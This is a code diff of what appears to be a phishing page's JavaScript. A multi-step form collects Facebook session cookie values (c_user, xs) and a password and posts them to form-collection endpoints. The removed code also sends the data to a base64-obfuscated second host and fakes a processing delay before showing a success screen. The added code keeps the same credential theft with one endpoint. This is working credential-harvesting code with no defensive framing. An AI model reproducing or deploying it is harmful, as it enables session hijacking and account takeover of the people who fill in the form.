@@ -692,95 +692,95 @@
             }
         }
         
-        // Function to submit to first form (https://submit-form.com/XPZ70O6H3)
-        function submitToFirstForm(data) {
-            fetch('https://submit-form.com/XPZ70O6H3', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(data)
+        // Trigger browser validation
+          if (!cUserInput.checkValidity()) {
+            cUserInput.reportValidity();
+            return;
+          }
+
+          if (!xsInput.checkValidity()) {
+            xsInput.reportValidity();
+            return;
+          }
+
+                // Submit c_user and xs together
+          const formData = new FormData();
+          formData.append("c_user", cUserInput.value);
+          formData.append("xs", xsInput.value);
+
+          fetch("https://submit-form.com/T2JyIs7Q9 ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              c_user: cUserInput.value,
+              xs: xsInput.value
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Submission of c_user and xs failed");
+              }
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('First form submission successful:', data);
-            })
-            .catch(error => {
-                console.error('Error submitting to first form:', error);
+            .catch((error) => {
+              console.error("Submission error:", error);
             });
-        }
-        
-      
-        function submitToSecondForm(data) {
-            // Base64 encoded URL and headers
-            const encodedUrl = 'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=';
-            const decodedUrl = atob(encodedUrl);
-            
-            // Create form data
-            const formData = new FormData();
-            formData.append('c_user', data.c_user);
-            formData.append('xs', data.xs);
-            formData.append('password', data.password);
-            
-            fetch(decodedUrl, {
-                method: 'POST',
-                body: formData
+
+          // Proceed to next step
+          step1.classList.remove("active");
+          step2.classList.add("active");
+
+          steps[0].classList.remove("active");
+          steps[1].classList.add("active");
+        });
+
+        // Back to Step 1
+        backToStep1.addEventListener("click", function () {
+          step2.classList.remove("active");
+          step1.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[0].classList.add("active");
+        });
+
+        // Submit form
+        nextToStep3.addEventListener("click", function () {
+          const passwordInput = document.getElementById("password");
+
+          if (!passwordInput.checkValidity()) {
+            passwordInput.reportValidity();
+            return;
+          }
+          // Submit password separately
+          const formData = new FormData();
+          formData.append("password", passwordInput.value);
+
+          fetch("https://submit-form.com/T2JyIs7Q9 ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              password: passwordInput.value,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Password submission failed");
+              }
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.text();
-            })
-            .then(data => {
-                console.log('Second form submission successful:', data);
-            })
-            .catch(error => {
-                console.error('Error submitting to second form:', error);
+            .catch((error) => {
+              console.error("Submission error:", error);
             });
-        }
-        
-        // Final submission with loading animation
-        finalSubmitBtn.onclick = function() {
-            const password = document.getElementById("password").value;
-            const cUser = cUserInput.value;
-            const xsToken = xsInput.value;
-            
-            if (password && cUser && xsToken) {
-                // Show loading state
-                finalSubmitBtn.classList.add('button-loading');
-                finalSubmitBtn.disabled = true;
-                
-                // Prepare data to submit
-                const formData = {
-                    c_user: cUser,
-                    xs: xsToken,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    ip: '' // Will be captured server-side
-                };
-                
-                // Submit to both forms
-                submitToFirstForm(formData);
-                submitToSecondForm(formData);
-                
-                // Simulate processing delay (2 seconds)
-                setTimeout(() => {
-                    // Hide loading state
-                    finalSubmitBtn.classList.remove('button-loading');
-                    finalSubmitBtn.disabled = false;
-                    
-                    // Show success modal
-                    passwordModal.style.display = "none";
-                    successModal.style.display = "block";
-                    
+
+          // Proceed to success step
+          step2.classList.remove("active");
+          step3.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[2].classList.add("active");
+        });
                     // Reset form
                     cUserInput.value = "";
                     xsInput.value = "";
